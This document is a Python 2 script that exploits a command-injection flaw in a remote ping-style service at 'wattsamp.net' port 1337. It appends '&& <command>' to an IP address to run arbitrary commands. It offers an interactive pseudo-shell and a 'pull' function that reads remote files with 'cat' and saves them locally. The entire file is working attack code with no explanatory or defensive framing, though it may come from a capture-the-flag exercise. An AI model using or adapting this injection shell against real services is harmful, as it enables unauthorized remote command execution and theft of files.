import socket 
import time

host = "wattsamp.net" 
port = 1337 

def download(cmd):
	data = cmd.split(" ")
	print("Preview of Downloaded File: \n")
	info = execute_cmd("cat " + data[1])
	file = open(data[2], "w+")
	file.write(info)
	print("File has been successfully downloaded \n")


def execute_cmd(cmd): 

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	data = s.recv(1024)
	#print(data)
	#time.sleep(1)
	s.send("157.230.179.99 && " + cmd + " \n")
	#time.sleep(4)
	data = s.recv(1024)
	data = data.split("ms");
	#print(data)
	result = data[len(data)-1]
	result = result.split("\n")
	message = ""
	for str in result:
		message += str.strip() + ' '
	print(message)
	return message




if __name__=='__main__':
	commands = []
	print("Enter one of the Following commands:\nshell\npull <remote-path> <local-path>\nhelp\nquit\n")
	cmd = raw_input("Enter a Command \n")
	while cmd != "quit":
		if cmd == "help":
			print("Enter one of the Following commands: shell\npull <remote-path> <local-path>\nhelp\nquit\n")
		cdflag = 0 # going to use to know if we need to add an extra cd into the command
		if cmd == "shell":
			shell_cmd = raw_input('shell> ')
			if "cd " in shell_cmd:
				if cdflag == 0:
					cdflag = 1
				else: cdflag = 0
			commands.append(shell_cmd)
			while shell_cmd != "exit":
				temp = ""
				temp2 = ""
				if cdflag == 1:
					temp = shell_cmd
					for cmd in commands:
						if "cd " in cmd: 
							temp2 = cmd
					shell_cmd = temp2 + " && " + temp
				#finding directory we are in
				execute_cmd(shell_cmd)
				shell_cmd = raw_input('shell> ')
				commands.append(shell_cmd)
				if "cd " in shell_cmd:
					if cdflag == 0:
						cdflag = 1
					else: 
						cdflag = 0
						del commands[:]
		if "pull" in cmd:
			download(cmd)
		print("Enter one of the Following commands:\nshell\npull <remote-path> <local-path>\nhelp\nquit\n")
		cmd = raw_input("Enter a Command \n")

